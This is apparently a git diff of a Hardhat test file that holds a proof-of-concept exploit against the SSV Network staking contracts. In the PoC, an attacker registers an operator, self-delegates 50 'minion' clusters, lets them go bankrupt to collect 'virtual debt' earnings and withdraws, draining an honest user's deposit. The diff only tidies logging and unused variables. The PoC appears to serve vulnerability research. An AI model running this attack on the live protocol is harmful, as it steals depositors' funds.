@@ -3,7 +3,6 @@ import {
   initializeContract,
   registerOperators,
   bulkRegisterValidators,
-  CONFIG,
 } from './helpers/contract-helpers';
 import { mine } from '@nomicfoundation/hardhat-network-helpers';
 import { expect } from 'chai';
@@ -25,12 +24,11 @@ import { expect } from 'chai';
  * Expected Result: 9,750 SSV profit on 250 SSV investment (3,800% ROI)
  */
 describe('POC 5: Operator Sybil Self-Dealing Attack (ACTUAL PROTOCOL)', () => {
-  let ssvNetwork: any, ssvViews: any, ssvToken: any;
+  let ssvNetwork: any, ssvToken: any;
 
   beforeEach(async () => {
     const metadata = await initializeContract();
     ssvNetwork = metadata.ssvNetwork;
-    ssvViews = metadata.ssvNetworkViews;
     ssvToken = metadata.ssvToken;
   });
 
@@ -56,7 +54,7 @@ describe('POC 5: Operator Sybil Self-Dealing Attack (ACTUAL PROTOCOL)', () => {
       []
     );
 
-    console.log(`Honest user deposited: ${depositHonest / 10n**18n} SSV\n`);
+    console.log(`Honest user deposited: ${Number(depositHonest / 10n**18n)} SSV\n`);
 
     // ========== PHASE 2: Attacker Registers as Operator ==========
     console.log('--- PHASE 2: Attacker Registers as Operator ---\n');
@@ -66,7 +64,7 @@ describe('POC 5: Operator Sybil Self-Dealing Attack (ACTUAL PROTOCOL)', () => {
     const attackerOperatorId = attackerOperatorIds[0];
 
     console.log(`Attacker registered as Operator ID: ${attackerOperatorId}`);
-    console.log(`Attacker operator fee: ${attackerOperatorFee / 10n**18n} SSV/block\n`);
+    console.log(`Attacker operator fee: ${Number(attackerOperatorFee / 10n**18n)} SSV/block\n`);
 
     // ========== PHASE 3: Attacker Creates Minion Clusters ==========
     console.log('--- PHASE 3: Attacker Creates Minion Clusters (Self-Delegation) ---\n');
@@ -75,8 +73,8 @@ describe('POC 5: Operator Sybil Self-Dealing Attack (ACTUAL PROTOCOL)', () => {
     const minionCount = 50; // 50 minion clusters
 
     console.log(`Attacker creating ${minionCount} minion clusters...`);
-    console.log(`Each minion: ${minionDeposit / 10n**18n} SSV`);
-    console.log(`Total attacker investment: ${(minionDeposit * BigInt(minionCount)) / 10n**18n} SSV\n`);
+    console.log(`Each minion: ${Number(minionDeposit / 10n**18n)} SSV`);
+    console.log(`Total attacker investment: ${Number((minionDeposit * BigInt(minionCount)) / 10n**18n)} SSV\n`);
 
     // Create 50 minion clusters, all delegated to attacker's operator
     for (let i = 0; i < minionCount; i++) {
@@ -92,9 +90,9 @@ describe('POC 5: Operator Sybil Self-Dealing Attack (ACTUAL PROTOCOL)', () => {
 
     const initialPoolBalance = await ssvToken.read.balanceOf([ssvNetwork.address]);
     
-    console.log(`Total contract balance: ${initialPoolBalance / 10n**18n} SSV`);
-    console.log(`  - Honest user: ${depositHonest / 10n**18n} SSV`);
-    console.log(`  - Attacker minions: ${(minionDeposit * BigInt(minionCount)) / 10n**18n} SSV\n`);
+    console.log(`Total contract balance: ${Number(initialPoolBalance / 10n**18n)} SSV`);
+    console.log(`  - Honest user: ${Number(depositHonest / 10n**18n)} SSV`);
+    console.log(`  - Attacker minions: ${Number((minionDeposit * BigInt(minionCount)) / 10n**18n)} SSV\n`);
 
     // ========== PHASE 4: Time Passes - Minions Bankrupt ==========
     console.log('--- PHASE 4: Simulating 200 Blocks (Minion Bankruptcy) ---\n');
@@ -121,15 +119,15 @@ describe('POC 5: Operator Sybil Self-Dealing Attack (ACTUAL PROTOCOL)', () => {
     const profit = totalEarnings - investment;
     const roi = (profit * 10000n) / investment; // ROI in basis points
 
-    console.log(`Investment: ${investment / 10n**18n} SSV`);
-    console.log(`Total earnings: ${totalEarnings / 10n**18n} SSV`);
-    console.log(`Profit: ${profit / 10n**18n} SSV`);
-    console.log(`ROI: ${roi / 100n}%\n`);
+    console.log(`Investment: ${Number(investment / 10n**18n)} SSV`);
+    console.log(`Total earnings: ${Number(totalEarnings / 10n**18n)} SSV`);
+    console.log(`Profit: ${Number(profit / 10n**18n)} SSV`);
+    console.log(`ROI: ${Number(roi / 100n)}%\n`);
 
     console.log('Breakdown:');
-    console.log(`  - Collateralized earnings: ${investment / 10n**18n} SSV (first 5 blocks)`);
-    console.log(`  - Virtual debt earnings: ${profit / 10n**18n} SSV (remaining 195 blocks)`);
-    console.log(`  - Profit per minion: ${(earningsPerMinion - minionDeposit) / 10n**18n} SSV\n`);
+    console.log(`  - Collateralized earnings: ${Number(investment / 10n**18n)} SSV (first 5 blocks)`);
+    console.log(`  - Virtual debt earnings: ${Number(profit / 10n**18n)} SSV (remaining 195 blocks)`);
+    console.log(`  - Profit per minion: ${Number((earningsPerMinion - minionDeposit) / 10n**18n)} SSV\n`);
 
     // ========== PHASE 6: Attacker Withdraws ==========
     console.log('--- PHASE 6: Attacker Withdraws Operator Earnings ---\n');
@@ -144,15 +142,15 @@ describe('POC 5: Operator Sybil Self-Dealing Attack (ACTUAL PROTOCOL)', () => {
     const contractBalanceAfterWithdrawal = await ssvToken.read.balanceOf([ssvNetwork.address]);
     const actualWithdrawal = contractBalanceBeforeWithdrawal - contractBalanceAfterWithdrawal;
 
-    console.log(`Contract balance before withdrawal: ${contractBalanceBeforeWithdrawal / 10n**18n} SSV`);
-    console.log(`Attacker withdrew: ${actualWithdrawal / 10n**18n} SSV`);
-    console.log(`Contract balance after withdrawal: ${contractBalanceAfterWithdrawal / 10n**18n} SSV\n`);
+    console.log(`Contract balance before withdrawal: ${Number(contractBalanceBeforeWithdrawal / 10n**18n)} SSV`);
+    console.log(`Attacker withdrew: ${Number(actualWithdrawal / 10n**18n)} SSV`);
+    console.log(`Contract balance after withdrawal: ${Number(contractBalanceAfterWithdrawal / 10n**18n)} SSV\n`);
 
     // ========== PHASE 7: Honest User Check ==========
     console.log('--- PHASE 7: Honest User Attempts Withdrawal ---\n');
 
-    console.log(`Honest user is entitled to: ${depositHonest / 10n**18n} SSV`);
-    console.log(`Contract has: ${contractBalanceAfterWithdrawal / 10n**18n} SSV`);
+    console.log(`Honest user is entitled to: ${Number(depositHonest / 10n**18n)} SSV`);
+    console.log(`Contract has: ${Number(contractBalanceAfterWithdrawal / 10n**18n)} SSV`);
 
     // Calculate the deficit
     const deficit = depositHonest - contractBalanceAfterWithdrawal;
@@ -161,12 +159,12 @@ describe('POC 5: Operator Sybil Self-Dealing Attack (ACTUAL PROTOCOL)', () => {
       console.log('\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
       console.log('VULNERABILITY CONFIRMED: OPERATOR SELF-DEALING!');
       console.log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
-      console.log(`\nHONEST USER LOSS: ${deficit / 10n**18n} SSV`);
+      console.log(`\nHONEST USER LOSS: ${Number(deficit / 10n**18n)} SSV`);
       console.log('\nThe attacker achieved MASSIVE ROI through self-dealing:');
-      console.log(`  - Invested: ${investment / 10n**18n} SSV`);
-      console.log(`  - Earned: ${actualWithdrawal / 10n**18n} SSV`);
-      console.log(`  - Profit: ${(actualWithdrawal - investment) / 10n**18n} SSV`);
-      console.log(`  - ROI: ${roi / 100n}%`);
+      console.log(`  - Invested: ${Number(investment / 10n**18n)} SSV`);
+      console.log(`  - Earned: ${Number(actualWithdrawal / 10n**18n)} SSV`);
+      console.log(`  - Profit: ${Number((actualWithdrawal - investment) / 10n**18n)} SSV`);
+      console.log(`  - ROI: ${Number(roi / 100n)}%`);
       console.log('\nThis is the "Infinite Money Glitch":');
       console.log('  - Small investment in minion clusters');
       console.log('  - Massive returns from virtual debt');
@@ -179,14 +177,14 @@ describe('POC 5: Operator Sybil Self-Dealing Attack (ACTUAL PROTOCOL)', () => {
     console.log('=================================================================');
     console.log(`Attack Vector: Operator Sybil Self-Dealing`);
     console.log(`Minion Clusters: ${minionCount}`);
-    console.log(`Investment: ${investment / 10n**18n} SSV`);
-    console.log(`Earnings: ${actualWithdrawal / 10n**18n} SSV`);
-    console.log(`Profit: ${(actualWithdrawal - investment) / 10n**18n} SSV`);
-    console.log(`ROI: ${roi / 100n}%`);
-    console.log(`Initial Pool: ${initialPoolBalance / 10n**18n} SSV`);
-    console.log(`Remaining Pool: ${contractBalanceAfterWithdrawal / 10n**18n} SSV`);
-    console.log(`Honest User Entitlement: ${depositHonest / 10n**18n} SSV`);
-    console.log(`Honest User Loss: ${deficit / 10n**18n} SSV`);
+    console.log(`Investment: ${Number(investment / 10n**18n)} SSV`);
+    console.log(`Earnings: ${Number(actualWithdrawal / 10n**18n)} SSV`);
+    console.log(`Profit: ${Number((actualWithdrawal - investment) / 10n**18n)} SSV`);
+    console.log(`ROI: ${Number(roi / 100n)}%`);
+    console.log(`Initial Pool: ${Number(initialPoolBalance / 10n**18n)} SSV`);
+    console.log(`Remaining Pool: ${Number(contractBalanceAfterWithdrawal / 10n**18n)} SSV`);
+    console.log(`Honest User Entitlement: ${Number(depositHonest / 10n**18n)} SSV`);
+    console.log(`Honest User Loss: ${Number(deficit / 10n**18n)} SSV`);
     console.log('=================================================================\n');
 
     // Verify the vulnerability
